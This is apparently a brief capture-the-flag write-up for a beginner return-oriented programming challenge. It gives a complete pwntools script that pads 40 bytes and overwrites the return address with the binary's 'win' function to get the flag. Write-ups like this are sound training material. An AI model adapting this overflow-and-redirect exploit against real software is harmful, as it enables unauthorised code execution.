# Return Oriented Programming 1.0

Running the provided executable file, we are provided with the offset (40) and the target function name. We can use native tool from `pwn` to get the flag.

Code:

```python
from pwn import *

elf = context.binary = ELF("/challenge/babyrop_level1.0")

io = process()

print("===== STARTING EXPLOIT =====")

offset = 40

payload = flat(
    b'A' * offset,
    elf.sym['win']
)

io.sendline(payload)

io.recvuntil(b'flag:\n')
print(f'Flag: {io.recvline(False)}')
```

Flag:

![[Return Oriented Programming/images/Level1.0.png]]